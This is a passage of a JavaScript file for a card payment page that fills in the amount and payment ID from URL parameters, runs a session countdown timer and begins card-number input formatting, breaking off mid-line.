// script.js
document.addEventListener('DOMContentLoaded', function () {
    // --- Elements ---
    const countdownElement = document.getElementById('countdown');
    const amountValueElement = document.getElementById('amountValue');
    const paymentIdElement = document.getElementById('paymentId');
    const payAmountElement = document.getElementById('payAmount');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const cardHolderInput = document.getElementById('cardHolder');
    const paymentForm = document.getElementById('paymentForm');

    // --- Get URL Parameters ---
    const urlParams = new URLSearchParams(window.location.search);
    const transactionId = urlParams.get('transaction_id');
    const amount = urlParams.get('amount');
    const paymentId = urlParams.get('payment_id');

    // --- Initialize Page Data ---
    if (amount) {
        amountValueElement.textContent = parseFloat(amount).toFixed(2);
        payAmountElement.textContent = `${parseFloat(amount).toFixed(2)} USD`;
    }
    if (paymentId) {
        paymentIdElement.textContent = paymentId;
    }

    // --- Countdown Timer ---
    let totalSeconds = 29 * 60 + 4; // 29 minutes and 4 seconds

    function updateCountdown() {
        const minutes = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
        const seconds = (totalSeconds % 60).toString().padStart(2, '0');
        countdownElement.textContent = `${minutes}:${seconds}`;

        if (totalSeconds > 0) {
            totalSeconds--;
        } else {
            countdownElement.textContent = "00:00";
            paymentForm.querySelector('button[type="submit"]').disabled = true;
            paymentForm.innerHTML += `<p style="color:red; text-align:center;">Session expired. Please restart the payment.</p>`;
        }
    }

    // Update every second
    const timerInterval = setInterval(updateCountdown, 1000);

    // --- Card Number Formatting ---
    cardNumberInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D